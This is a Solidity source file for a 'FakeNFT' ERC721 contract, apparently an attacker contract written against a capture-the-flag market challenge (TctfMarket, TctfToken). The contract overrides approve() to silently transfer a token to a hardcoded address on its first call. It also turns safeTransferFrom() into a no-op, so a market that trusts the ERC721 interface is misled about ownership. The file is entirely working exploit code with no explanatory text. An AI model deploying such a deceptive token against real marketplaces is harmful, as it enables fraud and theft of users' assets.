// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./Task.sol";


contract FakeNFT is ERC721 {
    uint256 called = 0;
    uint256 approved = 0;
    TctfMarket market;
    TctfToken token;

    constructor() ERC721("FakeNFT", "FNFT") {
        _setApprovalForAll(address(this), msg.sender, true);
    }

    function getParams(address t1, address t2) public {
        market = TctfMarket(t1);
        token = TctfToken(t2);
    }

    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }

    function approve(address dest, uint256 tokenId) public override {
        if(approved == 0) {
            super.safeTransferFrom(msg.sender, address(0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199), 1);
        } else {
            super.approve(dest, tokenId);
        }
        approved += 1;
    }

    function safeTransferFrom(address, address, uint256) public override {
        
    }
}